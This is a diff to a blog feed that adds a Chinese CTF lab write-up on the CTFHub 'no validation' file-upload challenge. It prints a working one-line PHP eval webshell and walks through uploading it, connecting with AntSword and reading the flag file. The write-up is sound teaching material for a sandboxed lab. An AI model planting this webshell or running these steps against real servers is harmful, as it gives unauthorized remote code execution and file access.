@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>ch6：一句话木马</title>
+    <link href="/2026/11/22/ch6%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
+    <url>/2026/11/22/ch6%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    
+    <content type="html"><![CDATA[<h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><table><thead><tr><th>项</th><th>配置</th></tr></thead><tbody><tr><td>靶机</td><td>CTFHub 技能树 · Web · 文件上传 ·「无验证」</td></tr><tr><td>环境形态</td><td>平台分配的沙箱容器，开启后限时可用</td></tr><tr><td>访问地址</td><td><a href="http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/">http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800</a></td></tr><tr><td>服务端</td><td>Apache + PHP（Linux 容器，站点根目录 &#x2F;var&#x2F;www&#x2F;html）</td></tr><tr><td>工具</td><td>Chrome、中国蚁剑（AntSword）</td></tr></tbody></table><p>说明两点：一是环境地址和容器每次开启都会变，本文用 challenge-xxxxxxxx 代指；二是平台未公开具体 PHP 版本，实测支持 eval 与 @ 抑制符，后面用到的语法均可用。</p><p>该关卡的定位是整棵技能树的入口题：上传点没有任何前端校验、没有 Content-Type 检查、没有文件头校验，上传目录又允许解析 PHP。</p><p><img src="/images/ch62.png" alt="环境说明"></p><h2 id="二、什么是一句话木马"><a href="#二、什么是一句话木马" class="headerlink" title="二、什么是一句话木马"></a>二、什么是一句话木马</h2><p>一句话木马是一段极短的、把“执行什么”交给外部输入的服务端脚本。它本身不含攻击逻辑，只提供一条“接收参数 → 执行”的通道：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>三个部件各司其职：eval() 把字符串当 PHP 代码执行；<code>$_POST[&#39;a&#39;]</code> 是外部可控输入；@ 抑制报错，避免错误信息污染回显。密码就是参数名 a。</p><p>本质一句话：它不是病毒，是一个 RCE 入口点——把代码执行能力从“写死在文件里”变成“随请求下发”。</p><p><img src="/images/ch61.png" alt="一句话木马原理"></p><h2 id="三、写入-上传木马"><a href="#三、写入-上传木马" class="headerlink" title="三、写入 &#x2F; 上传木马"></a>三、写入 &#x2F; 上传木马</h2><ul><li>本地新建 shell.php，写入上面那行代码，保存为 UTF-8</li><li>在题目页面点击「开启题目」，进入上传点（消耗 50 金币，容器随即启动）</li><li>选择 shell.php 直接上传，页面返回“上传成功”</li><li>回显不会给完整地址，按站点结构拼接：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/upload/shell.php<br></code></pre></td></tr></table></figure><p>浏览器访问该地址。</p><p><img src="/images/ch63.png" alt="上传成功"></p><p><img src="/images/ch64.png" alt="拼接地址"></p><p>验证解析是否生效：访问后页面空白，说明 PHP 已执行、只是没有输出；若把 <code>&lt;?php ... ?&gt;</code> 源码原样打印出来，说明该目录不解析 PHP，这条路不成立。</p><h2 id="四、用连接工具连上"><a href="#四、用连接工具连上" class="headerlink" title="四、用连接工具连上"></a>四、用连接工具连上</h2><p>蚁剑 → 添加数据：</p><table><thead><tr><th>字段</th><th>值</th></tr></thead><tbody><tr><td>URL 地址</td><td><a href="http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/upload/shell.php">http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/upload/shell.php</a></td></tr><tr><td>连接密码</td><td>a</td></tr><tr><td>连接类型</td><td>PHP</td></tr><tr><td>编码设置</td><td>UTF8</td></tr><tr><td>编码器</td><td>default</td></tr></tbody></table><p>点“测试连接”，提示“连接成功”，随后可进入文件管理。</p><p><img src="/images/ch65.png" alt="蚁剑连接成功"></p><p>连上后进文件管理，站点根目录 &#x2F;var&#x2F;www&#x2F;html&#x2F; 下有一个文件名带随机数字的 PHP 文件，形如 flag_1233021661.php，打开即可读到 ctfhub{…}。flag 写在注释里，不会通过访问 URL 显示，必须读到文件内容才能拿到——这正好说明一句话木马提供的是任意文件读取 + 任意代码执行，而不只是“访问某个页面”。</p><p><img src="/images/ch66.png" alt="读取 flag 文件"></p><p>注：每个沙箱实例的 flag 不同，本文记录的值只对当时那次容器有效。</p><h2 id="五、操作与小结"><a href="#五、操作与小结" class="headerlink" title="五、操作与小结"></a>五、操作与小结</h2><p>连上之后能做什么：浏览&#x2F;读取&#x2F;修改&#x2F;删除站点目录下的文件；执行系统命令；连接数据库；上传下载文件。Web 进程能触达的一切都归攻击者所有。</p><p>实验结论：只要“上传点不校验”与“落盘目录可执行”同时成立，就等于任意代码执行。木马只有 28 个字符，真正的门槛在前置条件——这也是 CTF 里上传题几乎都在考“绕过过滤”而不是“写木马”的原因。</p><p>本次实验在 CTFHub 提供的隔离沙箱内完成，仅用于学习原理，请勿用于未授权测试。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>一句话木马</tag>
+      
+      <tag>Webshell</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ch6：远程控制</title>
     <link href="/2026/11/22/ch6%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
     <url>/2026/11/22/ch6%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
